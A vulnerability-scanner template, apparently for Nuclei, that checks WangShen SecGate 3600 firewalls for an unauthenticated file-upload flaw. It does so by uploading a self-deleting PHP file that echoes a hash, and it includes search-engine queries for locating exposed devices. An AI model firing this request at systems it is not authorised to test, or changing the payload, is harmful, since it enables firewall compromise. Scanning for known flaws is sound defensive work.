@@ -1,0 +1,64 @@
+id: qax-secgate3600-syshandupfile-upload-rce
+
+info:
+  name: WangShen SecGate 3600 Firewall - Arbitrary File Upload
+  author: Co5mos
+  severity: high
+  description: |
+    WangShen SecGate 3600 Firewall's sys_hand_upfile feature has an arbitrary file upload vulnerability that allows attackers to upload any file to the server, potentially leading to server compromise and execution of malicious commands.
+  remediation: |
+    Immediately disable the affected sys_hand_upfile feature and contact the vendor for a security patch.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%BD%91%E7%A5%9ESecGate%203600%20%E9%98%B2%E7%81%AB%E5%A2%99sys_hand_upfile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-434
+    cpe: cpe:/a:wangshen:secgate_3600
+  metadata:
+    vendor: wangshen
+    product: secgate_3600
+    fofa-query: 'body="./images/lsec/login/loading.gif" && title="网神SecGate 3600防火墙"'
+    shodan-query: 'http.title:"网神SecGate 3600防火墙" && http.html:"./images/lsec/login/loading.gif"'
+  tags: cve,cve2023,wangshen,fileupload,intrusive,rce
+
+variables:
+  filename: '{{rand_base(6)}}.php'
+  md5_value: "ef775988943825d2871e1cfa75473ec0"
+
+http:
+  - raw:
+      - |
+        POST /?g=sys_hand_upfile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/3.0)
+        Content-Length: 319
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y
+
+        ------WebKitFormBoundaryoZ8meKnrrso89R6Y
+        Content-Disposition: form-data; name="upfile"; filename="{{filename}}"
+
+        <?php echo md5('99999999');unlink(__FILE__);?>
+        ------WebKitFormBoundaryoZ8meKnrrso89R6Y
+        Content-Disposition: form-data; name="submit_post"
+
+        sys_hand_upfile
+        ------WebKitFormBoundaryoZ8meKnrrso89R6Y--
+
+      - |
+        GET /attachements/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "ef775988943825d2871e1cfa75473ec0"
